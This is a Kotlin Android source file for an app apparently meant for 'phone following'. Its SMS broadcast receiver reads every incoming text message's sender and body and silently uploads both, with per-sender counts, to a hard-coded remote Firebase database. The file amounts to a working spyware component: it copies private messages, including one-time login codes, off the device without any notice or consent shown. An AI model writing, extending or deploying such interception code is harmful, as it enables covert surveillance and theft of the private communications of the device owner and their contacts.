package com.greyinc.telephonefollowing

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class SMSReceiver : BroadcastReceiver() {
    private val smsCountMap = mutableMapOf<String, Int>()

    override fun onReceive(context: Context?, intent: Intent?) {
        val bundle: Bundle? = intent?.extras
        if (bundle != null) {
            val pdus = bundle.get("pdus") as? Array<*>
            if (pdus != null) {
                for (pdu in pdus) {
                    val message = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = message.originatingAddress
                    val body = message.messageBody

                    if (sender != null) {
                        Log.d("SMSReceiver", "Gelen SMS: $body - Gönderen: $sender")

                        // SMS sayısını artır ve yerel olarak tut
                        smsCountMap[sender] = smsCountMap.getOrDefault(sender, 0) + 1

                        // Firebase'e kaydetme işlemi
                        val database = FirebaseDatabase.getInstance("https://telephonefollow-default-rtdb.europe-west1.firebasedatabase.app")
                        val smsRef = database.getReference("sms_received")

                        // SMS mesajını kaydet
                        smsRef.push().setValue("Gönderen: $sender - Mesaj: $body")

                        // Göndericinin SMS sayısını Firebase'de güncelle
                        val countRef = smsRef.child("sms_count").child(sender)
                        countRef.setValue(smsCountMap[sender])
                    }
                }
            } else {
                Log.e("SMSReceiver", "PDUs null geldi!")
            }
        } else {
            Log.e("SMSReceiver", "Bundle null geldi!")
        }
    }
}
